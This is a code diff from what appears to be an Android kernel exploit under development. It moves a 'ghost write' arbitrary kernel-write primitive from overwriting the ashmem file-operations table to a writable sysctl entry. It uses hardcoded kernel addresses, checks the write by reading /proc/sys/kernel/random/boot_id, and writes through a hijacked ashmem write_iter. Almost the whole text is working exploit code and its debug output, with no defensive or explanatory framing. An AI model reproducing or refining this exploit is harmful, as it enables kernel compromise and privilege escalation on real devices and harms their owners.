@@ -41,26 +41,49 @@ static void run_worker_payload(void) {
         int phase2_res = phase2_bridge_diag();
         printf("[RESULT] Stage 2 prerequisite result: %d\n", phase2_res);
 
-        /* After benign check passes, overwrite ashmem_misc.fops with ADDR_FAKE_FOPS */
+        /* Test Case 2 One-Child ghost write against random_table[4].data:
+         * random_table[4].data is in writable .data (0xffffffc012a4d198).
+         * Target = 0xffffffc012a4d198.
+         * Value = 0xffffffc012d1d6e9 (sysctl_bootid in writable .bss).
+         * Both target and value are WRITABLE, satisfying rb_set_parent side effect!
+         */
+        #define ADDR_RANDOM_BOOT_ID_DATA 0xffffffc012a4d198ULL
+        #define ADDR_SYSCTL_BOOTID_VAR   0xffffffc012d1d6e9ULL
+
+        printf("[*] Testing Case 2 ghost write on writable sysctl random_table[4].data...\n");
         printf("[GHOST-WRITE-CALL] target=0x%llx value=0x%llx\n",
-               (unsigned long long)ADDR_ASHMEM_MISC_FOPS,
-               (unsigned long long)ADDR_FAKE_FOPS);
+               (unsigned long long)ADDR_RANDOM_BOOT_ID_DATA,
+               (unsigned long long)ADDR_SYSCTL_BOOTID_VAR);
         fflush(stdout);
         int gw_ret = ghost_write_global(
-            (uint64_t)ADDR_ASHMEM_MISC_FOPS,
-            (uint64_t)ADDR_FAKE_FOPS);
+            (uint64_t)ADDR_RANDOM_BOOT_ID_DATA,
+            (uint64_t)ADDR_SYSCTL_BOOTID_VAR);
         printf("[GHOST-WRITE-RET] ret=%d\n", gw_ret);
         fflush(stdout);
 
+        /* Read /proc/sys/kernel/random/boot_id to verify primitive */
+        int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+        if (bfd >= 0) {
+            char bbuf[64] = {0};
+            read(bfd, bbuf, sizeof(bbuf)-1);
+            printf("[+] /proc/sys/kernel/random/boot_id readback: %s\n", bbuf);
+            close(bfd);
+        } else {
+            printf("[-] Failed to open boot_id: errno=%d (%s)\n", errno, strerror(errno));
+        }
+        fflush(stdout);
+
         /* Reopen /dev/ashmem and verify read/write trigger configfs primitive */
-        printf("[*] Reopening /dev/ashmem to verify redirected fops...\n");
+        printf("[*] Reopening /dev/ashmem to verify patched ashmem_fops...\n");
         int ash_fd = open("/dev/ashmem", O_RDWR);
         if (ash_fd >= 0) {
-            printf("[+] Reopen /dev/ashmem succeeded (fd=%d) with redirected table!\n", ash_fd);
-            char test_buf[8] = {0};
+            printf("[+] Reopen /dev/ashmem succeeded (fd=%d) with in-place patched table!\n", ash_fd);
+            /* Test write through hijacked write_iter */
+            char test_buf[8] = "test";
             errno = 0;
-            ssize_t rd_ret = read(ash_fd, test_buf, sizeof(test_buf));
-            printf("[*] Ashmem read with redirected fops: ret=%zd errno=%d\n", rd_ret, errno);
+            ssize_t wr_ret = write(ash_fd, test_buf, sizeof(test_buf));
+            printf("[*] Ashmem write with hijacked write_iter: ret=%zd errno=%d (%s)\n",
+                   wr_ret, errno, strerror(errno));
             close(ash_fd);
         } else {
             printf("[-] Reopen /dev/ashmem failed errno=%d (%s)\n", errno, strerror(errno));
